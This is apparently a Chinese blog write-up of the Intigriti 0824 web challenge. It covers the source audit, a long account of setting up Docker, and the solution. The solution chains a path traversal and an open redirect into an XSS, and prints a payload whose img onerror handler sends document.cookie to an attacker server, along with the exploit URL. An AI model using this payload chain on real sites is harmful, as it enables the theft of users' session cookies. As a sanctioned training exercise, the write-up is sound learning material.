---
layout: post
title:  intigriti challenge 0824 writeup
tags: [xss,writeup]
---

最近看到有人分享intigriti challenge 0824 writeup，才发现这个挑战是每月都有，于是点击去做一下。

挑战的地址，https://challenge-0824.intigriti.io/report

## 源码审计
由于提供了代码，先下载进行审计。  

首先查看docker-compose.yml,可以看到一个网站和一个bot。FLAG就在bot的环境变量里面。

### bot
看一下bot/index.js，代码比较简单，提供一个接口/visit，请求提供url参数，之后会调用puppeteer去访问这个页面。
在访问之前，会将Flag设置到cookie里面。
因此，解题思路应该是访问的这个url有xss，通过xss来获取cookie。

### web
再来看一下web。
看一下app/views.py，是一个flask的web应用，功能是注册账号，创建note，举报note。
我们可以看到call_bot函数是去调用bot的函数，
```python
def call_bot(note_url, user_id):
    try:
        response = requests.post(f"{BOT_URL}/visit/", json={"url": note_url})
```
在report函数里面，会先检查url，通过之后会调用call_bot。
```python
def report():
    form = ReportForm()
    if form.validate_on_submit():
        note_url = form.note_url.data
        parsed_url = urlparse(note_url)
        base_url_parsed = urlparse(BASE_URL)

        if not parsed_url.scheme.startswith('http'):
            flash('URL must begin with http(s)://', 'danger')
        elif parsed_url.netloc == base_url_parsed.netloc and parsed_url.path == '/view' and 'note=' in parsed_url.query:
            note_id = parsed_url.query[-36:]
```
可以看到，这里检查了netloc，path，所以我们的url不能是其他域名的，path也是固定的。这里的note_id是取的query的最后的36位，之后判断note_id是否符合uuid的格式。因此，这里的note_id前面是可以放其他数据的。

我们在看一下view，就是拿到note参数，即note_id，之后调用模板templates/view.html，跟进view.html。
可以看到fetchNoteById函数，这里的`../`检测也是一个提示，提示我们目录跳转。fetch是将noteId拼接到url里面，所以可以跳转到其他路径。
再往下看，data.content过滤了，但是data.debug直接放到outerHTML，这里有xss。但是data.debug哪里来呢？先放一放。
```javascript
function fetchNoteById(noteId) {
        if (noteId.includes("../")) {
            showFlashMessage("Input not allowed!", "danger");
            return;
        }
        fetch("/api/notes/fetch/" + decodeURIComponent(noteId), {
            method: "GET",
            headers: {
                "X-CSRFToken": csrf_token,
            },
        })
            .then((response) => response.json())
            .then((data) => {
                if (data.content) {
                    document.getElementById("note-content").innerHTML =
                        DOMPurify.sanitize(data.content);
                    document.getElementById(
                        "note-content-section"
                    ).style.display = "block";
                    showFlashMessage("Note loaded successfully!", "success");
                } else if (data.error) {
                    showFlashMessage("Error: " + data.error, "danger");
                } else {
                    showFlashMessage("Note doesn't exist.", "info");
                }
                if (data.debug) {
                    document.getElementById("debug-content").outerHTML =
                        data.debug;
                    document.getElementById(
                        "debug-content-section"
                    ).style.display = "block";
                }
            });
    }
    function isValidUUID(noteId) {
        const uuidRegex =
            /[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;
        return uuidRegex.test(noteId);
    }

    window.addEventListener("load", function () {
        const urlParams = new URLSearchParams(window.location.search);
        const noteId = urlParams.get("note");
        if (noteId) {
            document.getElementById("note-id-input").value = noteId;
            validateAndFetchNote(noteId);
        }
    });
```
我们继续把view.html看完，可以看到load事件执行时，获取url中的note参数，之后调用validateAndFetchNote验证noteId，然后取fetch.
第一次看的时候，没有注意到还有isValidUUID验证，后面测试的时候也可以通过，觉得这个有什么用。后面再看时，发现正则并没有匹配开头，因此xxxx{uuid}这种格式也是可以通过test检测的，因此，不影响我们的payload。

那么，我们现在就是要利用data.debug来xss。

我们再看fetch note，只有content，并没有debug参数，所以想在note里面造一个debug参数不行。
```python
@main.route('/api/notes/fetch/<note_id>', methods=['GET'])
def fetch(note_id):
    note = Note.query.get(note_id)
    if note:
        return jsonify({'content': note.content, 'note_id': note.id})
    return jsonify({'error': 'Note not found'}), 404
```
再看看其他函数。根据前面的分析，我们是需要跨目录的，说不定其他参数可以控制。
```python
@main.route('/contact', methods=['GET', 'POST'])
def contact():
    form = ContactForm()
    return_url = request.args.get('return')
    if request.method == 'POST':
        if form.validate_on_submit():
            flash('Thank you for your message!', 'success')
            if return_url and is_safe_url(return_url):
                return redirect(return_url)
            return redirect(url_for('main.home'))
    if return_url and is_safe_url(return_url):
        return redirect(return_url)
    return render_template('contact.html', form=form, return_url=return_url)
```
我们看到contact请求，是有一个url跳转的。
因此，我们思路是这样的，report的url需要,note_id需要跳转到contact这个路径，然后view.html里面取fetch的时候，会访问到contact，这个请求会跳转到我们的网站，我们在自己的网站上返回一个json，里面的debug为xss代码，之后bot执行xss代码，将flag传出来。

思路有了，我们需要验证，接下来，就是本次最难的环节了，搭建本地测试环境。

## 搭环境
本来按照docker的口号，build once, run everywhere，我以为一条docker命令 就搞定了，谁知道，在做题目之前，还有那么多困难点等着。
由于我的测试环境没有docker，所以我们需要从头开始搭建。
### debian
首先需要下载debian的iso镜像，因为我本地的镜像旧了，安装之后有些服务没有。到debian官网去下载，结果163的源下载不够快，最后换了mirors.lzu.edu.cn，速度几十M，给国内大学点赞，这网速不影响创新。
下载完了之后，正常的安装，一步一步，中间下载又花了不少时间。
### docker
debian总算安装好了，下面来安装docker。安装docker官方的debian安装命令操作，结果download.docker.com访问超时，搜了一下。“嗯，这是一个普遍问题”。
```bash
# Add Docker's official GPG key:
sudo apt-get update
sudo apt-get install ca-certificates curl
sudo install -m 0755 -d /etc/apt/keyrings
sudo curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc
sudo chmod a+r /etc/apt/keyrings/docker.asc

# Add the repository to Apt sources:
echo \
  "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \
  $(. /etc/os-release && echo "$VERSION_CODENAME") stable" | \
  sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
sudo apt-get update


sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin
```
按照网上的做法，把key替换一下，把https://download.docker.com/linux/debian/gpg 替换为 https://mirrors.163.com/docker-ce/linux/debian/gpg ，把下面的https://download.docker.com/linux/debian 也替换为https://mirrors.163.com/docker-ce/linux/debian

```bash
sudo curl -fsSL https://mirrors.163.com/docker-ce/linux/debian/gpg -o /etc/apt/keyrings/docker-163.asc
sudo chmod a+r /etc/apt/keyrings/docker-163.asc
echo   "deb [arch=$(dpkg --print-architecture) signed-by=/etc/apt/keyrings/docker-163.asc] https://mirrors.163.com/docker-ce/linux/debian \
    $(. /etc/os-release && echo "$VERSION_CODENAME") stable" |   sudo tee /etc/apt/sources.list.d/docker.list > /dev/null
```
安装成功。
赶紧去运行docker-compose ,结果命令不存在。
#### docker-compose
docker-compose原来是个单独的bin，网络搜索需要单独下载。
```bash
curl -L "https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
```
好家伙，又一次遇到网络问题。网络上有提供gh proxy的，感谢。如果是生产环境，建议自己解决网络问题，这里是一次性的环境，所以临时用一下。
```bash
curl -L "https://gh-proxy.com/https://github.com/docker/compose/releases/latest/download/docker-compose-$(uname -s)-$(uname -m)" -o /usr/local/bin/docker-compose
sudo chmod +x /usr/local/bin/docker-compose
```
再次运行docker-compose，还是报错。搜了一下，是路径问题。
因为我使用的debian中文语言，所以`下载`目录就是中文的，不是Downloads。你说我为啥要选中文的呢？因为新鲜，之前没有用过中文的，发现这个中文输入法不错。将下载的source code移到其他目录，再次运行。
又报错了。说是docker-compose.yml里面 多了个version。我寻思，这代码不是从网站上下载的，这个挑战就是上个月，这环境差异这么大？
网络搜索，是版本问题，新版本没有version，于是修改compose.yml，删除version这一行。

再次运行，然后pull镜像的时候，又是漫长的等待。网络问题再次袭击。
使用docker镜像来加速下载。
```bash
# cat /etc/docker/daemon.json 
{
  "registry-mirrors": [
    "https://docker.m.daocloud.io"
  ]
}
```
docker-compose还是很慢。我们先自己docker pull将Docerfile里面的镜像名字给先pull下来。

接下来是apt update超级慢，网络搜索，是deb.debian.org的访问问题。
修改源，发现RUN命令时，/etc/apt/sources.list不存在，复制host主机的/etc/apt/sources.list到Docerfile对应的目录，然后使用COPY命令
```bash
COPY . .
RUN cp sources.list /etc/apt/sources.list

RUN sed -i 's/deb.debian.org/mirror.lzu.edu.cn/g' /etc/apt/sources.list \
     && sed -i 's/security.debian.org/mirror.lzu.edu.cn/g' /etc/apt/sources.list \
      &&  apt update &&   apt-get install -y postgresql-client curl && \
    rm -rf /var/lib/apt/lists/*
```
之后使用sed命令，讲sources.list里面的域名替换掉。但是运行的时候，还是会访问deb.debian.org。由于这次没有多大影响，就没有在意。

apt完了之后，发现pip访问也很慢。改源。
```bash
RUN pip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple
```
重新运行。好了，第一个镜像终于好了。然后第二个又错误了。

```
69.05 Setting up libc6:amd64 (2.36-9+deb12u8) ...
69.08 /usr/bin/perl: error while loading shared libraries: libcrypt.so.1: cannot open shared object file: No such file or directory
```
我们首先看一个下载问题，就是apt update的时候，还是会访问deb.debian.org，极慢。
搜索发现是还有个目录，我们直接删除掉。这也就解释了为什么没有/etc/apt/sources.list的时候，还是可以更新。
```bash
RUN rm -r /etc/apt/sources.list.d/
```
解决完了下载问题，再看看libcrypt.so.1的错误，网上说是版本问题，旧版本里面有，新版本里面没有，有一个建议是升级。
看到bot的Dockerfile是`FROM node:14-slim`，直接改成`FROM node:18-slim`, docker pull一下，再次`docker build .`。
发现npm的源也慢，继续换。
```bash
RUN npm install --registry=https://registry.npmmirror.com
```

至此，最困难的部分终于完了，环境起起来了。

## 解题

注册好账户之后，创建note，report，日志里面看不到啥，一直说超时。修改docker-compose.yml文件，将bot的8000端口也暴露出来。
我们直接调用bot的端口。
```bash
curl -X POST -H 'content-type:application/json' -d '{"url":"http://127.0.0.1/view?note=..%5c..%5c..%5ccontact?return=http://127.0.0.1%2fa?8870d42b-1ead-481f-ac7e-9a22751d10ed"}' http://127.0.0.1:8000/visit
```
发现有请求。
尝试着将ip换为域名，但是远程没有收到请求，可能是域名解析的问题。
`http://127.0.0.1/view?note=..\..\..\contact?return=https://[your_server]/json?72e02048-52e5-4fb2-b8e0-c59866231c94`
我们直接访问xss链接，发现服务端收到请求了，所以xss是存在的。

远程服务端构造的xss代码
```javascript
var payload = {"debug":"<img src onerror='(new Image()).src=\"http://[your_server]/?\"+escape(document.cookie)'>"}
return new Response(JSON.stringify(payload),{headers: {
      'Access-Control-Allow-Origin': 'http://127.0.0.1' ,
      'Access-Control-Allow-Headers': '*',
      'Access-Control-Allow-Methods': 'GET, OPTIONS',
      'Access-Control-Max-Age': '86400',
    },});
```

## 线上解题
我们去线上网站上操作一下，注册，create note，访问note，构造payload url
`https://challenge-0824.intigriti.io/view?note=..\..\..\contact?return=https://[your_server]/json?72e02048-52e5-4fb2-b8e0-c59866231c94`

report这个url。
查看服务端，发现没有，payload不对？
过了一会儿，再次查看log，发现收到了请求。
发现flag,`flag%3DINTIGRITI%7B1337uplivectf_[redacted]_d473%7D`

## 关机
接下来关机debian环境。
```bash
su
poweroff
# poweroff 命令不存在
/sbin/poweroff
```

收工。


